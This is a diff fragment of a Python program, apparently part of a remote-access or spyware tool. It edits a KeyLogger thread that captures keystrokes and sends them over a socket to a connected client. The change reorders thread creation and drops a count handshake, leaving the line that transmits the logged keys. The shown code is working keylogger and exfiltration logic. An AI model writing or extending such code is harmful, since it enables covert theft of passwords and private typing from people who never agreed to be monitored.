@@ -93,8 +93,6 @@ def Server_Running():
                     finally:
                         keyboard.release(Key.space)
                 break
-        t1 = threading.Thread(target=Stop)
-
         def KeyLogger():
             while True:
                 def on_press(key):
@@ -161,13 +159,12 @@ def Server_Running():
                     return keylog[0:]
 
                 data = write(keys)
-                client.sendall(bytes(str(count),"utf8"))
-                check = client.recv(1024).decode("utf8")
                 client.sendall(bytes(data,"utf8"))
                 check = client.recv(1024).decode("utf8")
                 keys.clear()
                 break
         t2 = threading.Thread(target=KeyLogger)
+        t1 = threading.Thread(target=Stop)
         t1.start()
         t2.start()
         t2.join()
